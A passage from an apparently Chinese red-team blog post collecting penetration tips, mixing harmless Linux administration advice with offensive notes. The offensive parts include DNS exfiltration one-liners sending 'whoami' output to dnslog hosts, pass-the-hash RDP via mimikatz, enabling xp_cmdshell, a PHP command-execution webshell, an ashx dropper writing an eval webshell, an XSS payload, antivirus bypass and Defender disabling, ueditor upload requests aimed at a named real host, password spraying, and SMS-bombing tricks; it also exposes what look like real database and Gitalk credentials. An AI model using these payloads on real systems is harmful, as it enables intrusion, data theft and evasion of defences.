<li>短信轰炸绕过：手机号前加 + 86 有可能会绕过，手机号输入邮箱，邮箱处输入手机号</li>
<li>手机号码前后加空格，86，086，0086，+86，0，00，/r,/n, 以及特殊符号等</li>
<li>手机号前加若干 + 会造成短信轰炸</li>
<li>获取短信验证码时，用逗号隔开两个手机号，有可能两个手机号能获取到同一个验证码</li>
</ul>
<blockquote>
<p>来自项目 : <a href="https://github.com/Power7089/PenetrationTest-Tips">Power7089/PenetrationTest-Tips</a></p>
</blockquote>
<hr>
<h1 id="蓝队">蓝队</h1>
<p>流量分析除了 wireshark 用科来的工具进行分析也是个不错的选择，有时候做 ctf 的分析题，直接用科来工具打开就可以发现异常包，还是挺有帮助的</p>
<hr>
<p>CobaltStrike 的 Fofa 语法</p>
<pre><code>cert=&quot;73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F&quot;
</code></pre>
<hr>
<p>红队常用的扫描器特征</p>
<ul>
<li>https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/http/RedTeam.txt</li>
</ul>
<hr>
<p>&quot;Beacon.dll&quot;、&quot;beacon.x64.dll&quot; 和 &quot;ReflectiveLoader&quot; 默认是 CS Beacon 的硬编码特征。当寻找内存中的后门时，可以利用这一点</p>
<figure data-type="image" tabindex="7"><img src="./assets/img/2.png" alt="" loading="lazy"></figure>
<hr>
<h1 id="linux">Linux</h1>
<p>当运行一个程序发现缺少库时,可以使用 apt-file 进行搜索，然后安装对应的软件包</p>
<pre><code class="language-bash">apt install apt-fileapt-file updateapt-file search &lt;xxx&gt;apt install &lt;xxx&gt;
</code></pre>
<blockquote>
<p>来自项目 : <a href="https://github.com/firmianay/Tips-for-Geek">firmianay/Tips-for-Geek</a></p>
</blockquote>
<hr>
<p>用于文本处理的几个工具</p>
<ul>
<li>tr : 多功能处理</li>
<li>https://github.com/tomnomnom/anew : 自动去重</li>
<li>jq : json 格式化</li>
<li>expand/unexpand : 空格和 TAB 转换</li>
</ul>
<hr>
<p>命令行下截图的一种不错的方式</p>
<ul>
<li>asciinema</li>
</ul>
<hr>
<p>神器级工具,Linux 下的 everything</p>
<ul>
<li>https://github.com/junegunn/fzf</li>
</ul>
<figure data-type="image" tabindex="8"><img src="./assets/img/6.png" alt="" loading="lazy"></figure>
<hr>
<p>推荐一个 linux 小工具 trash-cli 用于移动文件到回收站，同时会记录文件的原地址、删除日期和权限。trash-cli 和 KDE、GNOME、XFCE 使用同一个回收站，你可以在命令行或脚本运行 trash-cli。一定程度上可以代替 rm</p>
<ul>
<li>地址:https://github.com/andreafrancia/trash-cli/blob/master/README_zh-CN.rst</li>
</ul>
<hr>
<p>一个探针工具，可用于实时监测服务器运行状况</p>
<ul>
<li>地址:https://github.com/naiba/nezha</li>
</ul>
<hr>
<p>linux 使用过程中经常出现安装软件包失败的问题,很多情况是遇到了锁,可以直接删除(运维兄弟们,生产环境下不要用啊🤣🤣🤣)</p>
<ul>
<li>
<p>debian系<br>
报错：无法获得锁 /var/lib/apt/lists/lock - open (11: 资源暂时不可用)</p>
<pre><code class="language-bash">rm -rf /var/cache/apt/archives/lockrm -rf /var/lib/dpkg/lock-frontendrm -rf /var/lib/dpkg/lockrm /var/lib/dpkg/lockrm /var/lib/apt/lists/lock
</code></pre>
</li>
<li>
<p>redhat系<br>
报错：/var/run/yum.pid 已被锁定,PID 为 xxxx 的另一个程序正在运行.</p>
<pre><code class="language-bash">rm -f /var/run/yum.pid 2&gt; /dev/null
</code></pre>
</li>
<li>
<p>特立独行的 Fedora<br>
报错：Waiting for process with pid <xxx> to finish.</p>
<pre><code class="language-bash">rm -f /var/cache/dnf/metadata_lock.pid 2&gt; /dev/null
</code></pre>
</li>
</ul>
<hr>
<p>在 linux 中安装一些组件的依赖时会有比如 python-dev 和  python-devel 的区别,devel 或 dev 包主要是供开发用，这代表不同的发行版本，redhat 系是 devel ，debian 系是 dev</p>
<hr>
<p>修改 Linux 的 DNS 一直是一个问题，每次开机 dns 都会重置，debian 下可以使用 dns 管理工具一劳永逸的解决</p>
<ul>
<li>
<p>安装</p>
<pre><code class="language-bash">apt-get install -y resolvconf
</code></pre>
</li>
<li>
<p>配置</p>
<pre><code class="language-bash">echo &quot;nameserver 223.5.5.5&quot; &gt; /etc/resolvconf/resolv.conf.d/head
</code></pre>
</li>
<li>
<p>更新</p>
<pre><code class="language-bash">resolvconf -u
</code></pre>
</li>
<li>
<p>若需要更改 DNS,请修改 <code>/etc/resolvconf/resolv.conf.d/head</code> 文件</p>
</li>
</ul>
<hr>
<p>如果在 red hat 系发行版中需要装开发工具,建议安装 Development Tools ，可以将常用软件，一次性装好</p>
<ul>
<li>
<p>安装</p>
<pre><code class="language-bash">yum groupinstall -y &quot;Development Tools&quot;
</code></pre>
</li>
</ul>
<hr>
<p>分享几个linux性能调优的技巧</p>
<pre><code class="language-bash">sync    # sync 命令做同步,以确保文件系统的完整性,将所有未写的系统缓冲区写到磁盘中,包含已修改的 i-node、已延的块 I/O 和写映射文件.否则在释放缓存的过程中,可能会丢失未保存的文件.echo 1 &gt; /proc/sys/vm/drop_caches   # 清理 pagecache(页面缓存)echo 2 &gt; /proc/sys/vm/drop_caches   # 清理 dentries(目录缓存)和inodesecho 3 &gt; /proc/sys/vm/drop_caches   # 清理 pagecache、dentries 和 inodessync# 取消开启文件数限制ulimit -n 65535# 优化内存echo 128 &gt; /proc/sys/vm/nr_hugepages        # 默认为0sysctl -w vm.nr_hugepages=128
</code></pre>
<hr>
<p>最近在 linux 搭建 vpn 服务的时候遇到时间和时区不同步的情况，分享下解决方案</p>
<p>查看当前时区</p>
<pre><code class="language-bash">timedatectl
</code></pre>
<p>修改当前时区：</p>
<pre><code class="language-bash">timedatectl set-timezone Asia/Shanghai# 或cp  /usr/share/zoneinfo/Asia/Shanghai  /etc/localtime
</code></pre>
<hr>
<p>由于 python 官方停止了对 python2 的维护，以后大部分和 pip2 有关的操作都会报下面这个错，我预估一下，这个应该是以后我们遇到最常见的问题之一, 解决方案很简单, 安装指定版本的 pip2 即可</p>
<figure data-type="image" tabindex="9"><img src="./assets/img/3.png" alt="" loading="lazy"></figure>
<pre><code>curl https://bootstrap.pypa.io/2.7/get-pip.py --output get-pip.pypython get-pip.py
</code></pre>
<hr>
<p>Python 2 在 Ubuntu 20 上不存在，但是有时候还是需要的。可以通过以下命令安装</p>
<pre><code class="language-bash">apt-get install python-is-python2
</code></pre>
<hr>
<hr>
<h4 id="cve-2020-14386-linux-kernel权限提升漏洞">CVE-2020-14386: Linux kernel权限提升漏洞 :</h4>
<p><strong>内核提权漏洞</strong>，poc：https://www.openwall.com/lists/oss-security/2020/09/03/3</p>
<hr>
<p><strong>php imap命令执行：imap_open调用rsh连接远程，但是debain默认使用ssh，ssh存在-o雕鹰系统命令，因此存在命令注入。</strong></p>
<figure data-type="image" tabindex="10"><img src="http://showdoc.wiki.com.qax/server/index.php?s=/api/attachment/visitFile/sign/f418b83f0debd061f1d5978f256b5758" alt="" loading="lazy"></figure>
<hr>
<p>**各种waf：**https://mp.weixin.qq.com/s/PWkqNsygi-c_S7tW1y_Hxw</p>
<hr>
<p><strong>excel导入打xxe</strong></p>
<p>https://xz.aliyun.com/t/3741</p>
<hr>
<p><strong>启动apache</strong></p>
<pre><code>/etc/init.d/apache2 start
</code></pre>
<hr>
<p><strong>ssh软连接</strong></p>
<p>https://www.jozxing.cc/archives/1653</p>
<hr>
<p><strong>apache shiro</strong></p>
<p>https://www.cnblogs.com/nul1/p/12827021.html</p>
<hr>
<p><strong>提权合集</strong></p>
<p>https://mp.weixin.qq.com/s/gijFjloNrEshsSaiMHr8oQ</p>
<hr>
<p><strong>jwt</strong></p>
<p>https://xz.aliyun.com/t/6776#toc-10</p>
<hr>
<p><strong>winrm 执行命令、端口复用</strong></p>
<p>https://blog.csdn.net/k8gege/article/details/106442655</p>
<hr>
<p><strong>红队工具</strong></p>
<p>https://github.com/root-tools/redtool</p>
<hr>
<p><strong>pth+rdp</strong></p>
<p>https://www.dazhuanlan.com/2020/01/18/5e22c1493adef/</p>
<pre><code>privilege::debug
sekurlsa::pth /user:administrator /domain:. /ntlm:xxxxxxxxxxxxxxxxxxxxxx &quot;/run:mstsc.exe /restrictedadmin&quot;
Copy
条件：
Server需要开启Restricted Admin mode
Windows 7 和 Windows Server 2008 R2默认不支持，需要安装补丁2871997、2973351
Copy
</code></pre>
<p><strong>开启Restricted Admin mode:</strong></p>
<pre><code>REG ADD HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
Copy
</code></pre>
<hr>
<p><strong>设备默认口令</strong></p>
<p>http://www.srxh1314.com/mrkl.html</p>
<hr>
<p><strong>ue上传</strong></p>
<p>https://zhuanlan.zhihu.com/p/42888106</p>
<hr>
<p>**<br>
无回显外带**</p>
<pre><code>cmd /v /c &quot;whoami &gt; temp &amp;&amp; certutil -encode temp temp2 &amp;&amp; findstr /L /V &quot;CERTIFICATE&quot; temp2 &gt; temp3 &amp;&amp; set /p MYVAR=&lt; temp3 &amp;&amp; set FINAL=!MYVAR!.b9530dbeff7692920356.d.zhack.ca &amp;&amp; nslookup !FINAL!&quot;

或

for /F &quot;delims=\ tokens=2&quot; %i in ('whoami') do ping -n 1 %i.bm21t3.dnslog.cn
Copy
</code></pre>
<hr>
<p><strong>pth + rdp</strong></p>
<pre><code>sekurlsa::pth /user:administrator /domain:. /ntlm:xxxxxxxxxxxxxxxxxxxxxx &quot;/run:mstsc.exe /restrictedadmin&quot;
Copy
</code></pre>
<hr>
<p><strong>清除日志</strong></p>
<figure data-type="image" tabindex="11"><a href="https://p6-tt-ipv6.byteimg.com/large/pgc-image/b2f859ff474f4dabb7390f10ea1dff59"><img src="https://p6-tt-ipv6.byteimg.com/large/pgc-image/b2f859ff474f4dabb7390f10ea1dff59" alt="img" loading="lazy"></a></figure>
<hr>
<p><strong>linux提权：</strong></p>
<p>https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=2651102317&amp;idx=1&amp;sn=0b0a840bd30896eb28b02ac117700bad&amp;chksm=bd1f0ee68a6887f00b1bfbf8996d516abfed498e264561e4d022de359beacb96efe10c000733&amp;scene=132#wechat_redirect</p>
<hr>
<p><strong>mssql cmd</strong></p>
<pre><code>-- 判断用户
and 1=(select IS_SRVROLEMEMBER('public') )--
and 1=(select IS_SRVROLEMEMBER('sysadmin') )--
and 1=(select IS_SRVROLEMEMBER('db_owner') )--

-- 开启xp_cmdshell
EXEC sp_configure 'show advanced options',1
RECONFIGURE

EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE

EXEC master..xp_cmdshell '123.zpu2he.dnslog.cn'

-- RECONFIGURE报错的话就用
reconfigure with override
Copy
</code></pre>
<hr>
<p><strong>mysqldump</strong></p>
<pre><code>mysqldump --defaults-extra-file=/tmp/11.cnf --databases jiebei_com &gt;/home/www/jb.com/runtime/log/202010/jiebei_com.sql
Copy
[client]
port = 3306
socket = /tmp/mysql.sock
default-character-set = utf8mb4
host = 127.0.0.1
user = 'jiebei_com'
password = 'k7SHT62npa3j8RrS'
Copy
</code></pre>
<hr>
<p><strong>SimplyEmail</strong></p>
<pre><code>./SimplyEmail.py -all -v -e 
Copy
</code></pre>
<hr>
<p><strong>xray扫描</strong></p>
<pre><code>.\xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output zyhy3.htmlpython3 lancher.pyCopy
</code></pre>
<hr>
<p><strong>易受攻击点</strong></p>
<p>https://mp.weixin.qq.com/s/6I-Yp0A69rLr3RfruIAkhA</p>
<hr>
<p><strong>cisco asa任意文件读取</strong></p>
<p>https://github.com/cygenta/CVE-2020-3452/blob/main/CVE-2020-3452.py</p>
<hr>
<h4 id="exchange-cve-2020-17144">Exchange CVE-2020-17144</h4>
<p>poc: https://srcincite.io/pocs/cve-2020-17141.py.txt</p>
<h4 id="cve-2020-16875">CVE-2020-16875</h4>
<p>poc: https://srcincite.io/pocs/cve-2020-16875.py.txt</p>
<hr>
<p><strong>citrix xenmobile任意文件读取</strong></p>
<pre><code>/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwdCopy
</code></pre>
<hr>
<p>vmware文件读取：</p>
<p>https://twitter.com/ptswarm/status/1316016337550938122</p>
<hr>
<p>内网不出网</p>
<p>https://mp.weixin.qq.com/s/IeH06p7pkQ3lmOehGLUWLg</p>
<p>dnscat</p>
<hr>
<p>mysql 8.0新特性</p>
<ul>
<li>
<p>table:</p>
<pre><code>TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]Copy
</code></pre>
</li>
</ul>
<figure data-type="image" tabindex="12"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201210193347-9156b91a-3adb-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201210193347-9156b91a-3adb-1.png" alt="img" loading="lazy"></a></figure>
<figure data-type="image" tabindex="13"><img src="http://showdoc.wiki.com.qax/server/index.php?s=/api/attachment/visitFile/sign/dd86f8549cd48edfee1ba56eb73fe7bf" alt="" loading="lazy"></figure>
<ul>
<li>
<p>value:</p>
<pre><code>select * from users where id = 1 union values row(1,2,3)Copy
</code></pre>
<hr>
</li>
</ul>
<p>当php system没有调用cmd权限</p>
<p>通过建立新的com对象调用其他的cmd.exe</p>
<pre><code>&lt;?php$command=$_POST[a];$wsh = new COM('WScript.shell');   // 生成一个COM对象$exec = $wsh-&gt;exec('cmd.exe /c '.$command); //调用对象方法来执行命令$stdout = $exec-&gt;StdOut();$stroutput = $stdout-&gt;ReadAll();echo $stroutput?&gt;Copy
</code></pre>
<hr>
<p>xss payload</p>
<pre><code>&lt;%00EEEE&lt;svg /\/\//ONLoad='a\u006c\u0065\u0072\u0074(1)'/\/\/\&gt;svg&gt;%0APayloadCopy
</code></pre>
<hr>
<p>通过certutil进行编码解码文件bypass杀软</p>
<pre><code># 编码Certutil -encode d:\artifact.exe d:\artifact.txt# 写入echo sfAFASFAsfasgasdf………&gt;&gt;d:\1.txt# 解码Certutil -decode d:\art.txt d:\art.exeCopy
</code></pre>
<hr>
<p>关闭defender</p>
<pre><code>C:\PROGRA~1\WINDOW~1&gt;MpCmdRun.exe -RemoveDefinitions -allMpCmdRun.exe -RemoveDefinitions -allService Version: 4.18.1812.3Engine Version: 1.1.17600.5AntiSpyware Signature Version: 1.327.2026.0AntiVirus Signature Version: 1.327.2026.0NRI Engine Version: 1.1.17600.5NRI Signature Version: 1.327.2026.0Starting engine and signature rollback to none...Done!Copy
</code></pre>
<hr>
<p>站库分离操作内容</p>
<ul>
<li>mysql</li>
</ul>
<pre><code>  select @@hostname;                                 //服务端主机名称select * from information_schema.PROCESSLIST;      //客户端主机名称和端口select load_file('C:/Windows/System32/drivers/etc/hosts');   //读取文件/etc/hosts/etc/apache2/apache2.conf/etc/httpd/conf/httpd.conf/etc/udev/rules.d/70-persistent-net.rules          //获取网卡名称/etc/network/interfaces                            //DHCP或静态IP/var/lib/dhclient/dhclient--网卡.lease             //DHCP/etc/sysconfig/network-scripts/ifcfg-网卡          //静态IPC:/Windows/System32/drivers/etc/hostsC:/Windows/system32/inetsrv/MetaBase.xmlC:/Windows/System32/inetsrv/config/applicationHost.configC:/phpStudy/Apache/conf/httpd.confC:/phpStudy/Apache/conf/vhosts.confC:/phpStudy/PHPTutorial/Apache/conf/httpd.confC:/phpStudy/PHPTutorial/Apache/conf/vhosts.confC:/phpStudy/PHPTutorial/nginx/conf/nginx.confC:/phpStudy/PHPTutorial/nginx/conf/vhosts.confCopy
</code></pre>
<ul>
<li>
<p>mssql</p>
<pre><code>select host_name();                       //客户端主机名称select @@servername;                      //服务端主机名称select serverproperty('MachineName');     //服务端主机名称select name from master.sys.sysdatabases;    //查看连接到数据库的机器名select * from master.sys.sysprocesses where dbid= db_id('sqlinject');Copy
</code></pre>
</li>
<li>
<p>模拟令牌</p>
<pre><code>只要有主机在使用Windows身份验证连接到这台数据库服务器的MSSQL时就会保留当前登录用户的令牌，而大多数人又都是以默认Administrator管理员来安装的MSSQL，所以能够直接获取到Administrator令牌。# msfmeterpreter &gt; use IncognitoCopy
</code></pre>
</li>
</ul>
<hr>
<p>ashx webshell</p>
<ul>
<li>会自己生成一个aspx webshell</li>
</ul>
<pre><code>&lt;%@ WebHandler Language=&quot;C#&quot; Class=&quot;Handler&quot; %&gt; using System; using System.Web; using System.IO; public class Handler : IHttpHandler {     public void ProcessRequest (HttpContext context) {         context.Response.ContentType = &quot;text/plain&quot;;         string show=&quot;&lt;%@ Page Language=\&quot;Jscript\&quot;%&gt;&lt;%eval(Request.Item[\&quot;chopper\&quot;],\&quot;unsafe\&quot;);%&gt;&quot;;         StreamWriter file1= File.CreateText(context.Server.MapPath(&quot;root.aspx&quot;));         file1.Write(show);         file1.Flush();         file1.Close();     }     public bool IsReusable {         get {             return false;         }     } }Copy
</code></pre>
<hr>
<p>ssh 反向端口转发</p>
<pre><code>ssh -R 0.0.0.0:rport:localhost:lport root@x.x.x.xCopy
</code></pre>
<hr>
<p>禁用theme主题</p>
<pre><code>&lt;%@ Page Language=&quot;Jscript&quot; EnableTheming = &quot;False&quot; StylesheetTheme=&quot;&quot; Theme=&quot;&quot; %&gt;Copy
</code></pre>
<hr>
<p>ue不出网利用</p>
<ul>
<li>
<p>上传本地</p>
<pre><code>POST /ueditor/net/controller.ashx?action=uploadimage HTTP/1.1Host: pmp.csc.com.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------19350128512434Content-Length: 199-----------------------------19350128512434Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;delicious.png&quot;Content-Type: image/png123-----------------------------19350128512434--Copy
</code></pre>
</li>
<li>
<p>抓取本地图片写入webshell</p>
<pre><code>POST /ueditor/net/controller.ashx?action=catchimage HTTP/1.1Host: pmp.csc.com.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 99source%5B%5D=http://127.0.0.1/App_Upload/ueditor/image/20210116/6374641084286323059465749.png?.htmlCopy
</code></pre>
<ul>
<li>如果不成就换几个端口试试</li>
</ul>
</li>
</ul>
<hr>
<p>常见web系统弱口令</p>
<p><a href="http://uuzdaisuki.com/2020/11/09/%E5%B8%B8%E8%A7%81web%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%80%BB%E7%BB%93/">http://uuzdaisuki.com/2020/11/09/%E5%B8%B8%E8%A7%81web%E7%B3%BB%E7%BB%9F%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E6%80%BB%E7%BB%93/</a></p>
<hr>
<p>域外枚举以及爆破</p>
<p>https://github.com/3gstudent/pyKerbrute</p>
<ul>
<li>
<p>EnumADUser.py</p>
<pre><code>python2 EnumADUser.py 192.168.60.1 test.com user.txt tcp
Copy
</code></pre>
<figure data-type="image" tabindex="14"><a href="https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1mzuLzWX3tEO1rBFlwia1K8S4s95dVSs0fER7MjQEbIiaEFsuUCP5dqgR2SIShMFAviaZbg5YCkqXEA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1"><img src="https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1mzuLzWX3tEO1rBFlwia1K8S4s95dVSs0fER7MjQEbIiaEFsuUCP5dqgR2SIShMFAviaZbg5YCkqXEA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="Image" loading="lazy"></a></figure>
<p><a href="https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1mzuLzWX3tEO1rBFlwia1K8S4s95dVSs0fER7MjQEbIiaEFsuUCP5dqgR2SIShMFAviaZbg5YCkqXEA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1">Image</a></p>
</li>
<li>
<p>ADPwdSpray.py</p>
<pre><code>python2 ADPwdSpray.py 192.168.60.1 hacke.testlab user.txt clearpassword QWE123!@# tcp
Copy
</code></pre>
<figure data-type="image" tabindex="15"><a href="https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1mzuLzWX3tEO1rBFlwia1K8MhnGJnaXW0hYfboxSyolicRQgldr3RKqI47tkJm6K6HB9qWj3nm9YcQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1"><img src="https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1mzuLzWX3tEO1rBFlwia1K8MhnGJnaXW0hYfboxSyolicRQgldr3RKqI47tkJm6K6HB9qWj3nm9YcQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="Image" loading="lazy"></a></figure>
<p><a href="https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1mzuLzWX3tEO1rBFlwia1K8MhnGJnaXW0hYfboxSyolicRQgldr3RKqI47tkJm6K6HB9qWj3nm9YcQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1">Image</a></p>
<pre><code>python2 ADPwdSpray.py 192.168.60.1 hacke.testlab user.txt ntlmhash 35c83173a6fb6d142b0359381d5cc84c udp
Copy
</code></pre>
<figure data-type="image" tabindex="16"><a href="https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1mzuLzWX3tEO1rBFlwia1K8JZFJSUBVH8wQYnKrhANENic6YG1jo9ckMLuNF6qQIyQGWdx3fMPUMzw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1"><img src="https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1mzuLzWX3tEO1rBFlwia1K8JZFJSUBVH8wQYnKrhANENic6YG1jo9ckMLuNF6qQIyQGWdx3fMPUMzw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="Image" loading="lazy"></a></figure>
<p><a href="https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic1mzuLzWX3tEO1rBFlwia1K8JZFJSUBVH8wQYnKrhANENic6YG1jo9ckMLuNF6qQIyQGWdx3fMPUMzw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1">Image</a></p>
</li>
</ul>

                        </div>
                        
                                
                                                    
                                                                    <!--Share-->
                                                                    <span style="margin-right:15px">
                        <i class="post-share"></i>
                        <span>&#x5206;&#x4EAB;:</span>
                                                                    <a title="QR 码" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://1oecho.github.io/voS1XhbeA/"><i class="fa fa-qrcode"></i></a>
                                                                    <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://1oecho.github.io/voS1XhbeA/&sharesource=qzone&title=攻防实战：实战TIPS集合（持续更新）&pics=https://1oecho.github.io/images/avatar.png?v=1702539383157&summary="><i class="fa fa-qq"></i></a>
                                                                    <a title="新浪微博" target="_blank" href="https://service.weibo.com/share/share.php?url=https://1oecho.github.io/voS1XhbeA/&sharesource=weibo&title=攻防实战：实战TIPS集合（持续更新） + " - " + &pic="https://1oecho.github.io/images/avatar.png?v=1702539383157 "><i class="fa fa-weibo "></i></a>

                                                                    </span>
                                                                    
                                                                            <!--zh-->
                                                                            <section class="post-tags zh ">
                                                                                <div>
                                                                                    <span>&#x6807;&#x7B7E;:</span>
                                                                                    <span class="tag ">
                        
                                </span>
                                                                                </div>
                                                                                <div>
                                                                                    <a href="javascript:window.history.back();">
                        &#x8FD4;&#x56DE;</a>
                                                                                    <span>&dot;</span>
                                                                                    <a href="#">&#x4E3B;&#x9875;</a>
                                                                                </div>
                                                                            </section>

                                                                            
                                                                                <!---->
                                                                                <section class="post-nav">
                                                                                    
                                                                                        <a class="prev" rel="prev" href="https://1oecho.github.io/fjA1kdB4U/">
                                                                                             红队开发: Behinder3-Beta11 实战下的二次开发 （3）
                                                                                        </a>
                                                                                        
                                                                                            
                                                                                                <a class="next" rel="next" href="https://1oecho.github.io/GxKPsWfW5/">
                                                                                                    内网渗透：实战思路以及相关命令
                                                                                                </a>
                                                                                                
                                                                                </section>
                    </article>
                </div>
                
                    
                        <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>

<div id="gitalk-container" style="width: 100%;max-width: 780px;margin: auto;"></div>

<script>
    var gitalk = new Gitalk({
        clientID: '61442cf87c4266a18189',
        clientSecret: '7a1fd1e53e9179e32c4600883cd0612d09e0f292',
        repo: 'loecho',
        owner: '1oecho',
        admin: ['1oecho'],
        id: (location.pathname).substring(0, 49), // Ensure uniqueness and length less than 50
        distractionFreeMode: false // Facebook-like distraction free mode
    })

    gitalk.render('gitalk-container')
</script>
                            
                                        
                                            
            </div>
    </div>
    </div>
    </div>
    
        <footer id="footer" class="footer">
            <div class="copyright">
                
                        loecho-sec
                            
                                <b id="hitokoto"></b><br>
                                
                                        <svg viewBox="0 0 1024 1024" style="margin-left: 5px;margin-right: 5px;" version="1.0" width="8" height="8" class="my-face">
            <path
                d="M863.597631 513.574282l-271.33965-140.213484L729.783667 81.926656c3.583731-7.87141 7.167462-15.742819 7.167462-25.214109C736.887134 25.226908 708.345275 0.012799 672.635953 0.012799a63.611229 63.611229 0 0 0-39.293053 12.607055c-1.791866 1.59988-3.519736 3.19976-5.311602 3.19976L147.87531 418.925381a55.547834 55.547834 0 0 0-19.646527 47.356448c1.791866 17.278704 14.27093 33.021523 32.125591 42.492813l271.33965 141.749369L292.504463 945.221908c-12.479064 25.214109-1.791866 53.563983 23.166262 69.306802 10.751194 6.335525 23.230258 9.47129 35.709322 9.47129 16.062795 0 32.125591-4.735645 44.604655-15.742819l480.091993-403.297753a55.547834 55.547834 0 0 0 19.646526-47.228458 61.243407 61.243407 0 0 0-32.12559-44.156688z"
                fill="#93b5cf"></path>
        </svg>
                                         &copy;Copyright
                                            <script>
                                                var date = new Date();
                                                document.write("" + date.getFullYear());
                                            </script>
                                            | Powered by
                                            <a href="https://1oecho.github.io/" target="_blank">
                                                loecho-sec
                                            </a>
            </div>
            <div id="update" style="display:none;">
                on
            </div>
            
                <div id="version" style="display:none;">
                    1.7.5
                </div>
                
                    <script>
                        var pat = '';
                        
                        document.write('<div id="home_path" style="display:none;">' + document.location.protocol + '//' + window.document.location.hostname + pat + '</div>')
                    </script>
        </footer>
        
            <script src='https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js'></script>
            
                <script>
                    
                    
                    loadlive2d();
                    
                    
                    hitokoto();
                    
                    getStar();
                    hljs.initHighlighting();
                    console.clear();
                    
                    CheckVersion();
                    
                    var newDate = new Date();
                    newDate.setTime(1702539383157);
                    console.log(" Blog Update Time: " + newDate.toLocaleDateString());
                    console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
                </script>
                
        </div>
</body>
<script>
    scroll();
</script>

</html>